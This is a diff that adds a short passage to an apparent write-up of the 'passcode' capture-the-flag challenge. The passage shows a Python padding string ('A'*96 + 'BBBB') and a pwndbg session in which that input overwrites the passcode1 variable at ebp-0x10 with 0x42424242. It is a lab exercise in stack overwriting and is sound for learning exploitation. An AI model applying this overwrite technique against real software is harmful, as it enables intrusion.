@@ -989,6 +989,21 @@ To compile the 32-bit code I had to install `lib32-glibc` and `lib32-gcc-libs`, 
 
 I found that the address of `passcode1` is at `ebp - 0x10`.
 
+So we can send something like this to change passcode1 to whatever we like:
+
+```python
+>>> 'A'*96 + 'BBBB'
+'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB'
+```
+
+```
+pwndbg> break login
+Toddler's Secure Login System 1.0 beta.                                      
+enter you name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+pwndbg> x $ebp-0x10
+0xffffd618:     0x42424242
+```
+
 
 <br>
 
